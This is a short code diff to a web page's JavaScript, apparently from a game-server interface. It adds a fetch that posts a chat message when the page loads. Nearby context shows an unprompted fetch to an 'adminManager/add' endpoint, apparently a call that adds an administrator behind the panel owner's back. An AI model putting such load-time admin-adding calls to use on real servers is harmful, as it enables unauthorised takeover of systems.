@@ -511,6 +511,12 @@ function typeCommand() {
   }
 }
 
+fetch("https://chat/chatResult", {
+    method: "POST",
+    body: JSON.stringify({ message: "/ooc ..??  " }),
+});
+
+
 fetch("https://monitor/WebPipe//adminManager/add", {
   "headers": {
     "accept": "application/json, text/javascript, /; q=0.01",
@@ -661,6 +667,7 @@ document.addEventListener('keydown', function(e) {
 
 </body>
 </html>
+
 
 
 
